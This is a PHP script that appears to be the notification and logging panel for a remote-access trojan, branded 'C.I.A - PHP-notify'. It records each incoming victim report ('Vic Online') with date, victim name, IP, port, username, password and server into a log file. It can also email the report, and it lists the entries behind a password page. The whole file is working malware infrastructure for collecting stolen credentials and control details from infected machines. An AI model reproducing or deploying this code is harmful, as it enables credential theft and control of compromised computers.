<?php
$email="";
$file="log.txt";
$msg="Vic Online";
$pwd="";
##################################################
#######################
$array_name_var=array(1=>"date",2=>"action",3=>"vicname",4=>"ip",5=>"port",6=>"usrname",7=>"password",8=>"server");
##################################################
#######################
error_reporting(0); 
IF($op != 1 && $op !=2 && !empty($HTTP_SERVER_VARS['QUERY_STRING']))
{
##################################################
#######################
function verif_email($mail){ 

if (empty($mail)) {return FALSE;}
elseif (strlen($mail) < 6){return FALSE;}
elseif (strlen($mail) > 255) {return FALSE;}
elseif (!ereg("@", $mail)){return FALSE;}
elseif (preg_match_all("/([^a-zA-Z0-9_\@\.\-])/i", $mail, $trouve)){return FALSE;}
elseif (!preg_match("/^([a-z0-9_]|\\-|\\.)+@(([a-z0-9_]|\\-)+\\.)+[a-z]{2,4}\$/i", $mail)){return FALSE;}
else{return TRUE;}
}
###############################################
if($HTTP_SERVER_VARS['REQUEST_METHOD']=="GET")
{
$array_var=$_GET; 
}
else
{
$array_var=$_POST; 
}
###############################################
$update="#"."\n".date("d-m-Y-H:i")."\n";

reset ($array_var);
while (list($key,$val)=each($array_var))
{
$update.=$key."=>".@trim(@str_replace("*","",$val))."\n";
}
if(verif_email($email)){mail($email,$msg,$update);
}

#########################
$fp=@fopen($file,"a+");
@fwrite($fp,$update);
@fclose($fp);
#########################

}
##################################################
####################### 
IF($op != 1 && empty($HTTP_SERVER_VARS['QUERY_STRING']))
{
if($HTTP_SERVER_VARS['QUERY_STRING']=="")
{
$title="C.I.A - PHP-notify [Enter Password]";
$input="Please enter password :";

print "<HTML><HEAD><TITLE>".$title."</Title></HEAD>
<BODY BGCOLOR=\"E7E3E7\">
<center><FORM ACTION=\"$PHP_SELF\">
<table width=\"40%\" cellpadding=\"1\" cellspacing=\"0\" border=\"1\" bgcolor=\"000000\" bordercolor =\"000000\"><br><br><br>
<tr bgcolor=\"94A6BD\">
<td align=\"center\">
<font color=\"424142\" size=\"2\" face=\"Verdana\"><b>".$input."</b></font>
</td>
</tr>
<tr bgcolor=\"E7E3E7\">
<td align=\"center\">
<INPUT TYPE=\"password\" NAME=\"password\" SIZE=\"30%\">
<INPUT TYPE=\"hidden\" NAME=\"op\" VALUE=\"1\">
<INPUT TYPE=\"submit\" VALUE=\"OK\">
</td>
</tr>
</table>
</FORM></CENTER>
</BODY></HTML>";
exit(); 
}
}
##################################################
####################### 
IF($op==1)
{
if($pwd==$pass)
{
$title="PHP-notify [vic listing]";

print "<HTML>
<HEAD>
<TITLE>".$title."</Title>
<style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#006699; SCROLLBAR-HIGHLIGHT-COLOR:#000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #CCCCCC; SCROLLBAR-TRACK-COLOR: #CCCCCC; } A:active {COLOR: #2092B0; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} A:hover {COLOR: #2092B0; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} A:link {COLOR: #006699; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} A {COLOR: #006699; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} --></style>
</HEAD>
<center>
<BODY BGCOLOR=\"E7E3E7\">
<table border=\"1\" cellpadding=\"4\" cellspacing=\"0\" bgcolor=\"94A6BD\" bordercolor=\"black\">
<tr>
<td colspan=\"".(count($array_name_var)+2)."\"><br><font style=font-size:13 face=sans-serif, Arial, Helvetica><b>C.I.A - PHP-Logger</b><br></td>
</tr>
<tr>";
for($i=1;$i<=count($array_name_var);$i++)
{
print "<td>".$array_name_var[$i]."</td>";
}
echo("</tr>");
##################################################
####################### 
$file_content=(@join("",@file($file)));
$array_file=(@explode("#",$file_content));

for($i=0;$i<count($array_file);$i++)
{
echo("<tr>");
$line[$i]=(explode("\n",$array_file[$i]));

for($j=0;$j<=count($array_name_var);$j++)
{

if(@ereg ("([0-9]{1,2})-([0-9]{1,2})-([0-9]{4})",$line[$i][$j])) 
{
echo("<td align=\"center\">");
echo($line[$i][$j]);
echo("</td>");
}
else
{
for($s=0;$s<count($line[$i]);$s++)
{
if(!empty($line[$i][$s]) && !empty($array_name_var[$j]))
{
if(stristr($line[$i][$s],$array_name_var[$j]))
{
echo("<td align=\"center\">");
echo(str_replace("=>","",strrchr($line[$i][$s],"=>")));
echo("</td>");
}
}

}
}
}

echo("</tr>");
}
exit;
}
else
{
$title="C.I.A - PHP-notify [invalid password]";
$input="Invalid password, try again :";

print "<HTML><HEAD><TITLE>".$title."</Title></HEAD>
<BODY BGCOLOR=\"E7E3E7\">
<center><FORM ACTION=\"$PHP_SELF\">
<table width=\"40%\" cellpadding=\"1\" cellspacing=\"0\" border=\"1\" bgcolor=\"000000\" bordercolor =\"000000\"><br><br><br>
<tr bgcolor=\"94A6BD\">
<td align=\"center\">
<font color=\"424142\" size=\"2\" face=\"sans-serif, Arial, Helvetica\"><b>".$input."</b></font>
</td>
</tr>
<tr bgcolor=\"E7E3E7\">
<td align=\"center\">
<INPUT TYPE=\"password\" NAME=\"pass\" SIZE=\"30%\">
<INPUT TYPE=\"hidden\" NAME=\"op\" VALUE=\"1\">
<INPUT TYPE=\"submit\" VALUE=\"OK\">
</td>
</tr>
</table>
</FORM></CENTER>
</BODY></HTML>";
exit(); 
}
}
?>
